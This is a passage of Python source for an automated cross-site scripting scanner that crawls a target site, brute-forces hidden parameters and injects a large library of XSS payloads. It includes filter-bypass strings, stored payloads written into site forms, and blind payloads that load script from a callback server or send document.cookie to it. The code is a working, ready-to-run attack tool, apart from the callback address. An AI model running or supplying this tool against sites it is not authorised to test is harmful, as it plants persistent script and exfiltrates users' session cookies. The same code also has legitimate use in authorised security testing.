"""
Advanced XSS Scanner
Detects: Reflected, Stored, DOM-based, Blind XSS
Features: Smart crawling, Filter bypass, Concurrent scanning, HTML report
"""

import requests
import asyncio
import aiohttp
import threading
import time
import json
import re
import hashlib
import random
import string
from urllib.parse import (
    urljoin, urlparse, parse_qs, urlencode,
    urlunparse, unquote
)
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from typing import Optional
from datetime import datetime
from collections import defaultdict
import argparse
import sys
import os

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
DEFAULT_THREADS     = 10
DEFAULT_DEPTH       = 3
DEFAULT_TIMEOUT     = 10
DEFAULT_DELAY       = 0.2   # seconds between requests
BLIND_CALLBACK_URL  = "https://your-callback-server.com/xss"   # change this

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/120.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

# ──────────────────────────────────────────────
# PAYLOAD DATABASE
# ──────────────────────────────────────────────
class PayloadDB:
    """Extensive payload database with bypass techniques."""

    BASIC = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
    ]

    EVENT_HANDLERS = [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(1) />",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<iframe onload=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<marquee onstart=alert(1)>",
        "<form><button formaction=javascript:alert(1)>click",
    ]

    FILTER_BYPASS = [
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        # No parentheses
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert`XSS`>",
        # HTML encoding inside event
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        # Unicode
        "<img src=x onerror=\u0061lert(1)>",
        # Null bytes
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        # Whitespace tricks
        "<img/src='x'/onerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        "<img\tsrc=x\tonerror=alert(1)>",
        # Double encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        # Broken tag
        "<<script>alert(1)//<</script>",
        # Template literals
        "<svg onload=alert`1`>",
        # Expression
        "<math><maction actiontype=statusline#http://x>click",
        # srcdoc
        "<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'>",
        # data URI
        "<iframe src=data:text/html,<script>alert(1)</script>>",
        # SVG animate
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        # JS URL
        "<a href=javascript:alert(1)>click</a>",
        "<a href=JaVaScRiPt:alert(1)>click</a>",
        # Without quotes
        "<img src=x onerror=alert(document.domain)>",
        # fromCharCode
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        # Concatenation
        "<script>var x='al';var y='ert';window[x+y](1)</script>",
    ]

    ATTRIBUTE_CONTEXT = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "\" onmouseover=\"alert(1)\" x=\"",
        "> <script>alert(1)</script>",
        "'><script>alert(1)</script>",
    ]

    JS_CONTEXT = [
        "';alert(1)//",
        '";alert(1)//',
        "\\';alert(1)//",
        '\\"alert(1)//',
        "`${alert(1)}`",
        "'-alert(1)-'",
        '"-alert(1)-"',
    ]

    URL_CONTEXT = [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ]

    STORED_MARKERS = [
        "<xss-stored-{id}>",
        "<img src=x id=xss-{id} onerror=alert(1)>",
        "<svg id=xss-{id} onload=alert(1)>",
    ]

    DOM_SINKS = [
        "javascript:/*--></title></style></textarea></script></xmp>"
        "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
    ]

    @classmethod
    def blind(cls, callback_url: str) -> list:
        return [
            f'"><script src="{callback_url}"></script>',
            f"'><script src='{callback_url}'></script>",
            f'<img src=x onerror=\'var s=document.createElement("script");'
            f's.src="{callback_url}";document.head.appendChild(s)\'>',
            f'<svg onload="fetch(\'{callback_url}?c=\'+document.cookie)">',
            f'"><iframe src=javascript:void(fetch("{callback_url}"))>',
        ]

    @classmethod
    def all_payloads(cls, callback_url: str = "") -> list:
        pl = (cls.BASIC + cls.EVENT_HANDLERS + cls.FILTER_BYPASS +
              cls.ATTRIBUTE_CONTEXT + cls.JS_CONTEXT + cls.URL_CONTEXT +
              cls.DOM_SINKS)
        if callback_url:
            pl += cls.blind(callback_url)
        return list(dict.fromkeys(pl))  # deduplicate preserving order


# ──────────────────────────────────────────────
# DATA MODELS
# ──────────────────────────────────────────────
@dataclass
class Finding:
    url: str
    param: str
    payload: str
    xss_type: str           # reflected | stored | dom | blind
    context: str            # html_body | attribute | js | url
    evidence: str           # snippet of response showing reflection
    method: str = "GET"
    form_action: str = ""
    severity: str = "High"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

@dataclass
class ScanStats:
    target: str
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())
    end_time: str = ""
    urls_crawled: int = 0
    forms_found: int = 0
    params_tested: int = 0
    requests_made: int = 0
    findings: list = field(default_factory=list)


# ──────────────────────────────────────────────
# CONTEXT DETECTOR
# ──────────────────────────────────────────────
class ContextDetector:
    """Detect where input is reflected and choose the best payload."""

    @staticmethod
    def detect(response_text: str, canary: str) -> str:
        """Return context: html_body | attribute | js | url | none"""
        if canary not in response_text:
            return "none"

        # Find position of canary
        pos = response_text.find(canary)
        surrounding = response_text[max(0, pos-200):pos+200]

        # Inside <script> block?
        script_open  = surrounding.rfind("<script", 0, 200)
        script_close = surrounding.rfind("</script>", 0, 200)
        if script_open != -1 and script_open > script_close:
            return "js"

        # Inside attribute?
        attr_patterns = [
            r'=\s*["\']?[^"\'<>]*' + re.escape(canary),
            r'href\s*=\s*["\']?[^"\'<>]*' + re.escape(canary),
        ]
        for pat in attr_patterns:
            if re.search(pat, surrounding, re.I):
                return "attribute"

        return "html_body"

    @staticmethod
    def best_payloads_for_context(context: str) -> list:
        if context == "js":
            return PayloadDB.JS_CONTEXT + PayloadDB.BASIC
        if context == "attribute":
            return PayloadDB.ATTRIBUTE_CONTEXT + PayloadDB.EVENT_HANDLERS
        if context == "url":
            return PayloadDB.URL_CONTEXT
        return PayloadDB.BASIC + PayloadDB.EVENT_HANDLERS + PayloadDB.FILTER_BYPASS


# ──────────────────────────────────────────────
# CRAWLER
# ──────────────────────────────────────────────
class Crawler:
    def __init__(self, base_url: str, depth: int = 3, delay: float = 0.2,
                 timeout: int = 10, session: requests.Session = None):
        self.base_url   = base_url
        self.base_host  = urlparse(base_url).netloc
        self.depth      = depth
        self.delay      = delay
        self.timeout    = timeout
        self.session    = session or requests.Session()
        self.visited    = set()
        self.lock       = threading.Lock()

    def crawl(self) -> dict:
        """Returns {url: {'forms': [...], 'params': [...]}}"""
        results = {}
        self._crawl_recursive(self.base_url, 0, results)
        return results

    def _crawl_recursive(self, url: str, depth: int, results: dict):
        if depth > self.depth:
            return
        normalized = self._normalize_url(url)
        with self.lock:
            if normalized in self.visited:
                return
            self.visited.add(normalized)

        try:
            time.sleep(self.delay)
            resp = self.session.get(url, timeout=self.timeout,
                                    allow_redirects=True)
            if "text/html" not in resp.headers.get("Content-Type", ""):
                return

            soup = BeautifulSoup(resp.text, "html.parser")
            forms  = self._extract_forms(url, soup)
            params = self._extract_url_params(url)

            results[url] = {"forms": forms, "params": params,
                            "response": resp.text[:5000]}

            # Find more links
            links = self._extract_links(url, soup)
            with ThreadPoolExecutor(max_workers=5) as ex:
                futs = [ex.submit(self._crawl_recursive, lnk, depth+1, results)
                        for lnk in links]
                for f in as_completed(futs):
                    pass

        except Exception as e:
            pass

    def _extract_forms(self, base_url: str, soup) -> list:
        forms = []
        for form in soup.find_all("form"):
            action  = urljoin(base_url, form.get("action", ""))
            method  = form.get("method", "get").lower()
            inputs  = []
            for inp in form.find_all(["input", "textarea", "select"]):
                inp_type = inp.get("type", "text")
                inp_name = inp.get("name", "")
                if inp_name:
                    inputs.append({"name": inp_name, "type": inp_type,
                                   "value": inp.get("value", "")})
            if inputs:
                forms.append({"action": action, "method": method,
                              "inputs": inputs})
        return forms

    def _extract_url_params(self, url: str) -> list:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())

    def _extract_links(self, base_url: str, soup) -> list:
        links = set()
        for tag in soup.find_all("a", href=True):
            href = urljoin(base_url, tag["href"])
            parsed = urlparse(href)
            if parsed.netloc == self.base_host and parsed.scheme in ("http","https"):
                links.add(href.split("#")[0])
        return list(links)

    def _normalize_url(self, url: str) -> str:
        p = urlparse(url)
        return urlunparse((p.scheme, p.netloc, p.path, "", "", ""))


# ──────────────────────────────────────────────
# PARAM FUZZER
# ──────────────────────────────────────────────
class ParamFuzzer:
    """
    Brute-forces hidden URL parameters using a wordlist.
    Detects if a param causes any difference in the response
    (length change, reflection, new content) — then flags it
    for XSS testing.
    """

    # 200+ common parameter names used across web apps
    WORDLIST = [
        # Search & input
        "q", "s", "search", "query", "keyword", "keywords", "term", "terms",
        "find", "lookup", "input", "text", "word", "filter",
        # Identity & auth
        "id", "uid", "user", "user_id", "userid", "username", "name",
        "account", "profile", "member", "email", "login", "token",
        "session", "key", "apikey", "api_key", "auth", "access_token",
        # Navigation
        "page", "p", "pg", "num", "offset", "limit", "start", "end",
        "from", "to", "next", "prev", "skip", "count", "size", "per_page",
        # Content
        "content", "body", "message", "msg", "comment", "description",
        "title", "subject", "note", "data", "value", "val", "info",
        "detail", "details", "summary", "text", "html", "raw",
        # URL & redirect
        "url", "link", "href", "src", "source", "dest", "destination",
        "redirect", "redirect_url", "return", "return_url", "returnurl",
        "next", "goto", "forward", "ref", "referer", "referrer", "back",
        "continue", "target", "location", "path", "uri",
        # File & media
        "file", "filename", "filepath", "path", "dir", "folder",
        "image", "img", "photo", "video", "media", "upload", "attachment",
        "doc", "document", "pdf", "format", "type", "ext",
        # Category & taxonomy
        "cat", "category", "tag", "tags", "label", "group", "section",
        "topic", "genre", "class", "type", "kind", "sort", "order",
        "orderby", "order_by", "sortby", "sort_by", "dir", "direction",
        # Dates & time
        "date", "time", "datetime", "year", "month", "day",
        "start_date", "end_date", "from_date", "to_date", "timestamp",
        # Config & display
        "lang", "language", "locale", "theme", "color", "style",
        "view", "mode", "layout", "template", "skin", "debug",
        "verbose", "output", "format", "callback", "jsonp",
        # E-commerce
        "product", "item", "sku", "price", "qty", "quantity",
        "cart", "order", "coupon", "promo", "discount", "code",
        # Misc common
        "action", "method", "op", "do", "cmd", "command", "exec",
        "module", "controller", "view", "route", "endpoint",
        "status", "state", "flag", "option", "options", "config",
        "version", "v", "ver", "build", "revision",
        "width", "height", "size", "scale", "quality",
        "callback", "fn", "func", "handler",
        "index", "i", "n", "c", "m",
    ]

    def __init__(self, session: requests.Session, timeout: int = 10,
                 delay: float = 0.1, threads: int = 10,
                 custom_wordlist: list = None):
        self.session  = session
        self.timeout  = timeout
        self.delay    = delay
        self.threads  = threads
        self.wordlist = custom_wordlist or self.WORDLIST
        self.canary   = "fuzzprobe7x"

    def fuzz_url(self, url: str) -> list:
        """
        Test each param in wordlist against a URL.
        Returns list of param names that appear to be active/reflected.
        """
        # Get baseline response
        try:
            baseline = self.session.get(url, timeout=self.timeout)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            return []

        found_params = []
        lock = threading.Lock()

        def test_param(param):
            try:
                time.sleep(self.delay)
                parsed = urlparse(url)
                test_params = {param: self.canary}
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(test_params), ""
                ))
                r = self.session.get(test_url, timeout=self.timeout)

                # Detection methods:
                # 1. Canary is reflected in response
                reflected = self.canary in r.text

                # 2. Response length changed significantly (>5% difference)
                len_diff = abs(len(r.text) - baseline_len)
                len_changed = len_diff > max(50, baseline_len * 0.05)

                # 3. Status code changed
                status_changed = r.status_code != baseline_status

                if reflected or len_changed or status_changed:
                    with lock:
                        found_params.append({
                            "param": param,
                            "url": url,
                            "detected_by": (
                                "reflection" if reflected else
                                "length_change" if len_changed else
                                "status_change"
                            ),
                            "test_url": test_url
                        })
                        print(f"    [PARAM FOUND] ?{param}= → detected by "
                              f"{'reflection' if reflected else 'length_change' if len_changed else 'status_change'}"
                              f" on {url}")
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            list(ex.map(test_param, self.wordlist))

        return found_params

    def fuzz_site(self, urls: list) -> dict:
        """Fuzz all crawled URLs. Returns {url: [param, ...]}"""
        results = {}
        print(f"\n[*] Param Fuzzer: Testing {len(self.wordlist)} params across {len(urls)} URLs...")
        for url in urls:
            # Only fuzz URLs without existing params (or always fuzz if you want)
            found = self.fuzz_url(url)
            if found:
                results[url] = found
        total = sum(len(v) for v in results.values())
        print(f"    Param fuzzer found {total} hidden parameters across {len(results)} URLs")
        return results


# ──────────────────────────────────────────────
# TESTER
# ──────────────────────────────────────────────
class XSSTester:
    def __init__(self, session: requests.Session, timeout: int = 10,
                 delay: float = 0.1, callback_url: str = ""):
        self.session      = session
        self.timeout      = timeout
        self.delay        = delay
        self.callback_url = callback_url
        self.detector     = ContextDetector()
        self.payloads     = PayloadDB.all_payloads(callback_url)
        self.request_count = 0
        self.lock          = threading.Lock()
        self._stored_markers = {}   # marker_id → {url, param, payload}

    def _req(self, method: str, url: str, **kwargs):
        with self.lock:
            self.request_count += 1
        time.sleep(self.delay)
        try:
            if method.upper() == "POST":
                return self.session.post(url, timeout=self.timeout, **kwargs)
            return self.session.get(url, timeout=self.timeout, **kwargs)
        except Exception:
            return None

    # ── Reflected XSS ──
    def test_reflected_url_param(self, url: str, param: str) -> list[Finding]:
        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        # First detect context with canary
        canary = "xsscanary" + self._rand(8)
        test_params = {k: v[0] for k, v in base_params.items()}
        test_params[param] = canary
        new_url = self._rebuild_url(parsed, test_params)
        resp = self._req("GET", new_url)
        if not resp:
            return findings

        context = self.detector.detect(resp.text, canary)
        if context == "none":
            return findings   # not reflected, skip

        smart_payloads = self.detector.best_payloads_for_context(context)

        for payload in smart_payloads:
            test_params[param] = payload
            test_url = self._rebuild_url(parsed, test_params)
            r = self._req("GET", test_url)
            if not r:
                continue
            if self._is_reflected(r.text, payload):
                findings.append(Finding(
                    url=test_url, param=param, payload=payload,
                    xss_type="reflected", context=context,
                    evidence=self._extract_evidence(r.text, payload),
                    method="GET"
                ))
                break   # one finding per param is enough
        return findings

    # ── Reflected XSS in Forms ──
    def test_reflected_form(self, url: str, form: dict) -> list[Finding]:
        findings = []
        action  = form["action"] or url
        method  = form["method"]
        inputs  = form["inputs"]

        for target_input in inputs:
            if target_input["type"] in ("submit", "button", "image", "reset", "checkbox", "radio"):
                continue
            name = target_input["name"]

            # Canary probe
            data = self._build_form_data(inputs, name, "xsscanary" + self._rand(6))
            r = self._req(method, action, data=data if method=="post" else None,
                          params=data if method=="get" else None)
            if not r:
                continue
            context = self.detector.detect(r.text, list(data.values())[0])

            smart_payloads = self.detector.best_payloads_for_context(context)

            for payload in smart_payloads:
                data2 = self._build_form_data(inputs, name, payload)
                r2 = self._req(method, action, data=data2 if method=="post" else None,
                               params=data2 if method=="get" else None)
                if not r2:
                    continue
                if self._is_reflected(r2.text, payload):
                    findings.append(Finding(
                        url=url, param=name, payload=payload,
                        xss_type="reflected", context=context,
                        evidence=self._extract_evidence(r2.text, payload),
                        method=method.upper(), form_action=action
                    ))
                    break
        return findings

    # ── Stored XSS ──
    def inject_stored_markers(self, url: str, form: dict) -> list[dict]:
        """Inject markers into forms that write to storage. Returns marker info."""
        injected = []
        action = form["action"] or url
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "image", "reset"):
                continue
            marker_id = self._rand(12)
            marker    = f"xss-stored-{marker_id}"
            payload   = f'<img src=x id="{marker}" onerror=alert(1)>'
            data = self._build_form_data(inputs, inp["name"], payload)
            r = self._req(method, action, data=data if method=="post" else None,
                          params=data if method=="get" else None)
            if r:
                injected.append({
                    "marker": marker, "url": url,
                    "param": inp["name"], "payload": payload
                })
        return injected

    def check_stored_markers(self, page_url: str, markers: list) -> list[Finding]:
        """Visit pages and look for our stored markers."""
        findings = []
        r = self._req("GET", page_url)
        if not r:
            return findings
        for m in markers:
            if m["marker"] in r.text:
                findings.append(Finding(
                    url=page_url, param=m["param"], payload=m["payload"],
                    xss_type="stored", context="html_body",
                    evidence=self._extract_evidence(r.text, m["marker"]),
                    method="GET"
                ))
        return findings

    # ── DOM XSS ──
    def test_dom_xss(self, url: str) -> list[Finding]:
        """Check URL fragments and DOM-dangerous params."""
        findings = []
        dom_payloads = PayloadDB.DOM_SINKS
        parsed = urlparse(url)

        for payload in dom_payloads:
            # Test via hash fragment
            test_url = url.split("#")[0] + "#" + payload
            r = self._req("GET", test_url)
            if not r:
                continue

            # Look for dangerous sink patterns in JS
            sinks = ["innerHTML", "document.write", "eval(", "setTimeout(",
                     "location.href", "outerHTML"]
            for sink in sinks:
                if sink in r.text:
                    findings.append(Finding(
                        url=test_url, param="fragment/#", payload=payload,
                        xss_type="dom", context="js",
                        evidence=f"DOM sink detected: {sink}",
                        method="GET"
                    ))
                    break
        return findings

    # ── Blind XSS ──
    def test_blind_xss(self, url: str, form: dict) -> list[Finding]:
        """Inject blind payloads into headers and form fields."""
        if not self.callback_url:
            return []
        findings = []
        blind_payloads = PayloadDB.blind(self.callback_url)
        action = form["action"] or url
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "image", "reset"):
                continue
            for payload in blind_payloads[:3]:   # limit blind requests
                data = self._build_form_data(inputs, inp["name"], payload)
                r = self._req(method, action, data=data if method=="post" else None,
                              params=data if method=="get" else None)
                if r and r.status_code < 500:
                    findings.append(Finding(
                        url=url, param=inp["name"], payload=payload,
                        xss_type="blind", context="html_body",
                        evidence=f"Blind payload injected — check {self.callback_url}",
                        method=method.upper(), form_action=action,
                        severity="Medium"
                    ))
                    break   # one per input
        return findings

    # ── Helpers ──
    def _is_reflected(self, body: str, payload: str) -> bool:
        return payload in body or unquote(payload) in body

    def _extract_evidence(self, body: str, marker: str) -> str:
        idx = body.find(marker)
        if idx == -1:
            return ""
        return body[max(0, idx-80):idx+len(marker)+80].strip()

    def _rebuild_url(self, parsed, params: dict) -> str:
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params), ""
        ))

    def _build_form_data(self, inputs: list, target_name: str, value: str) -> dict:
        data = {}
        for inp in inputs:
            if not inp["name"]:
                continue
            if inp["name"] == target_name:
                data[inp["name"]] = value
            elif inp["type"] == "email":
                data[inp["name"]] = "test@test.com"
            elif inp["type"] == "number":
                data[inp["name"]] = "1"
            else:
                data[inp["name"]] = inp.get("value") or "test"
        return data

    @staticmethod
    def _rand(n: int) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))


# ──────────────────────────────────────────────
# REPORT GENERATOR
# ──────────────────────────────────────────────
class ReportGenerator:
    @staticmethod
    def html_report(stats: ScanStats, output_path: str):
        findings = stats.findings
        high   = [f for f in findings if f.severity == "High"]
        medium = [f for f in findings if f.severity == "Medium"]

        color_map = {"reflected": "#e74c3c", "stored": "#8e44ad",
                     "dom": "#e67e22", "blind": "#2980b9"}

        rows = ""
        for i, f in enumerate(findings, 1):
            color = color_map.get(f.xss_type, "#7f8c8d")
            rows += f"""
            <tr>
              <td>{i}</td>
              <td><span class="badge" style="background:{color}">{f.xss_type.upper()}</span></td>
              <td class="url-cell" title="{f.url}">{f.url[:80]}{'...' if len(f.url)>80 else ''}</td>
              <td><code>{f.param}</code></td>
              <td>{f.method}</td>
              <td>{f.context}</td>
              <td><span class="sev-{f.severity.lower()}">{f.severity}</span></td>
              <td><code class="payload">{f.payload[:60]}{'...' if len(f.payload)>60 else ''}</code></td>
              <td class="evidence">{f.evidence[:100]}</td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XSS Scan Report — {stats.target}</title>
<style>
  :root {{
    --bg:#0f1117; --card:#1a1d27; --accent:#7c3aed;
    --text:#e2e8f0; --sub:#94a3b8; --border:#2d3148;
    --high:#ef4444; --med:#f59e0b; --low:#22c55e;
  }}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:2rem}}
  h1{{font-size:1.8rem;margin-bottom:.5rem;background:linear-gradient(135deg,#7c3aed,#2563eb);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
  .subtitle{{color:var(--sub);font-size:.9rem;margin-bottom:2rem}}
  .stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1rem;margin-bottom:2rem}}
  .stat{{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.2rem;text-align:center}}
  .stat .val{{font-size:2rem;font-weight:700;color:var(--accent)}}
  .stat .lbl{{font-size:.8rem;color:var(--sub);margin-top:.3rem}}
  table{{width:100%;border-collapse:collapse;background:var(--card);
         border-radius:12px;overflow:hidden;border:1px solid var(--border)}}
  th{{background:#13152a;padding:.8rem 1rem;text-align:left;font-size:.8rem;
      text-transform:uppercase;letter-spacing:.05em;color:var(--sub)}}
  td{{padding:.75rem 1rem;border-top:1px solid var(--border);font-size:.85rem;vertical-align:top}}
  tr:hover td{{background:rgba(124,58,237,.07)}}
  .badge{{padding:.25rem .6rem;border-radius:6px;font-size:.72rem;
          font-weight:700;color:#fff;letter-spacing:.05em}}
  .sev-high{{color:var(--high);font-weight:700}}
  .sev-medium{{color:var(--med);font-weight:700}}
  .sev-low{{color:var(--low);font-weight:700}}
  code{{background:#0a0b14;padding:.15rem .4rem;border-radius:4px;
        font-size:.8rem;color:#a5b4fc}}
  .payload{{color:#fbbf24;word-break:break-all}}
  .evidence{{color:var(--sub);font-size:.78rem;word-break:break-all}}
  .url-cell{{word-break:break-all;font-size:.8rem}}
  .section-title{{font-size:1.1rem;margin:2rem 0 1rem;color:var(--text)}}
  .no-findings{{text-align:center;padding:3rem;color:var(--sub)}}
</style>
</head>
<body>
<h1>⚡ XSS Scan Report</h1>
<p class="subtitle">Target: <strong>{stats.target}</strong> &nbsp;|&nbsp;
   Started: {stats.start_time} &nbsp;|&nbsp; Finished: {stats.end_time}</p>

<div class="stats">
  <div class="stat"><div class="val">{len(findings)}</div><div class="lbl">Total Findings</div></div>
  <div class="stat"><div class="val" style="color:#ef4444">{len(high)}</div><div class="lbl">High Severity</div></div>
  <div class="stat"><div class="val" style="color:#f59e0b">{len(medium)}</div><div class="lbl">Medium Severity</div></div>
  <div class="stat"><div class="val">{stats.urls_crawled}</div><div class="lbl">URLs Crawled</div></div>
  <div class="stat"><div class="val">{stats.forms_found}</div><div class="lbl">Forms Found</div></div>
  <div class="stat"><div class="val">{stats.params_tested}</div><div class="lbl">Params Tested</div></div>
  <div class="stat"><div class="val">{stats.requests_made}</div><div class="lbl">Requests Made</div></div>
</div>

<p class="section-title">📋 Findings</p>
{'<table><thead><tr><th>#</th><th>Type</th><th>URL</th><th>Param</th><th>Method</th><th>Context</th><th>Severity</th><th>Payload</th><th>Evidence</th></tr></thead><tbody>' + rows + '</tbody></table>' if findings else '<div class="no-findings">✅ No XSS findings detected.</div>'}

</body>
</html>"""

        with open(output_path, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"\n[✓] HTML Report saved → {output_path}")

    @staticmethod
    def json_report(stats: ScanStats, output_path: str):
        data = {
            "target": stats.target,
            "start": stats.start_time,
            "end": stats.end_time,
            "stats": {
                "urls_crawled": stats.urls_crawled,
                "forms_found": stats.forms_found,
                "params_tested": stats.params_tested,
                "requests_made": stats.requests_made,
            },
            "findings": [asdict(f) for f in stats.findings]
        }
        with open(output_path, "w") as f:
            json.dump(data, f, indent=2)
        print(f"[✓] JSON Report saved → {output_path}")


# ──────────────────────────────────────────────
# MAIN SCANNER
# ──────────────────────────────────────────────
class AdvancedXSSScanner:
    def __init__(self, target: str, depth: int = DEFAULT_DEPTH,
                 threads: int = DEFAULT_THREADS, timeout: int = DEFAULT_TIMEOUT,
                 delay: float = DEFAULT_DELAY, callback_url: str = "",
                 cookies: str = "", headers_extra: dict = None,
                 output_dir: str = ".", fuzz_params: bool = False,
                 custom_wordlist: list = None):
        self.target          = target.rstrip("/")
        self.depth           = depth
        self.threads         = threads
        self.timeout         = timeout
        self.delay           = delay
        self.callback_url    = callback_url
        self.output_dir      = output_dir
        self.fuzz_params     = fuzz_params
        self.custom_wordlist = custom_wordlist

        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        if cookies:
            for part in cookies.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    self.session.cookies.set(k.strip(), v.strip())
        if headers_extra:
            self.session.headers.update(headers_extra)

        self.stats  = ScanStats(target=self.target)
        self.tester = XSSTester(self.session, timeout, delay, callback_url)
        self.lock   = threading.Lock()

    def run(self):
        print(f"\n{'='*60}")
        print(f"  Advanced XSS Scanner")
        print(f"  Target  : {self.target}")
        print(f"  Depth   : {self.depth}  |  Threads: {self.threads}")
        print(f"  Blind CB: {self.callback_url or 'disabled'}")
        print(f"{'='*60}\n")

        # ── Phase 1: Crawl
        print("[*] Phase 1: Crawling target...")
        crawler = Crawler(self.target, self.depth, self.delay,
                          self.timeout, self.session)
        site_map = crawler.crawl()
        self.stats.urls_crawled = len(site_map)
        print(f"    Found {self.stats.urls_crawled} URLs")

        # Count forms & params
        all_tasks = []
        stored_markers = []

        for url, data in site_map.items():
            self.stats.forms_found += len(data["forms"])
            self.stats.params_tested += len(data["params"])
            for param in data["params"]:
                all_tasks.append(("url_param", url, param, None))
            for form in data["forms"]:
                all_tasks.append(("form_reflected", url, None, form))
                all_tasks.append(("form_blind", url, None, form))
                all_tasks.append(("form_stored_inject", url, None, form))
            all_tasks.append(("dom", url, None, None))

        print(f"    Forms: {self.stats.forms_found}  |  URL params: {self.stats.params_tested}")

        # ── Phase 2: Param Fuzzing (optional)
        if self.fuzz_params:
            fuzzer = ParamFuzzer(
                session=self.session,
                timeout=self.timeout,
                delay=self.delay,
                threads=self.threads,
                custom_wordlist=self.custom_wordlist
            )
            fuzz_results = fuzzer.fuzz_site(list(site_map.keys()))
            for url, found_params in fuzz_results.items():
                for fp in found_params:
                    param_name = fp["param"]
                    parsed = urlparse(url)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, urlencode({param_name: "test"}), ""
                    ))
                    all_tasks.append(("url_param", test_url, param_name, None))
                    self.stats.params_tested += 1
            total_fuzzed = sum(len(v) for v in fuzz_results.values())
            print(f"    Added {total_fuzzed} fuzzed params to XSS test queue")

        # ── Phase 3: Test
        print(f"\n[*] Phase 3: Testing {len(all_tasks)} tasks with {self.threads} threads...\n")
        findings = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._run_task, t): t for t in all_tasks}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    if isinstance(result[0], dict):
                        stored_markers.extend(result)
                    else:
                        findings.extend(result)
                        for f in result:
                            print(f"  [!!!] {f.xss_type.upper()} XSS → {f.url} | param={f.param}")

        # ── Phase 4: Check stored markers
        if stored_markers:
            print(f"\n[*] Phase 4: Checking {len(stored_markers)} stored markers...")
            for url in site_map:
                found = self.tester.check_stored_markers(url, stored_markers)
                findings.extend(found)
                for f in found:
                    print(f"  [!!!] STORED XSS → {f.url} | param={f.param}")

        self.stats.findings    = findings
        self.stats.end_time    = datetime.now().isoformat()
        self.stats.requests_made = self.tester.request_count

        # ── Phase 5: Report
        print(f"\n{'='*60}")
        print(f"  Scan Complete!")
        print(f"  Findings    : {len(findings)}")
        print(f"  Requests    : {self.stats.requests_made}")
        print(f"{'='*60}")

        os.makedirs(self.output_dir, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        html_path = os.path.join(self.output_dir, f"xss_report_{ts}.html")
        json_path = os.path.join(self.output_dir, f"xss_report_{ts}.json")
        ReportGenerator.html_report(self.stats, html_path)
        ReportGenerator.json_report(self.stats, json_path)
        return self.stats

    def _run_task(self, task: tuple):
        kind = task[0]
        try:
            if kind == "url_param":
                _, url, param, _ = task
                return self.tester.test_reflected_url_param(url, param)
            elif kind == "form_reflected":
                _, url, _, form = task
                return self.tester.test_reflected_form(url, form)
            elif kind == "form_blind":
                _, url, _, form = task
                return self.tester.test_blind_xss(url, form)
            elif kind == "form_stored_inject":
                _, url, _, form = task
                return self.tester.inject_stored_markers(url, form)
            elif kind == "dom":
                _, url, _, _ = task
                return self.tester.test_dom_xss(url)
        except Exception:
            return []
        return []


# ──────────────────────────────────────────────
# CLI
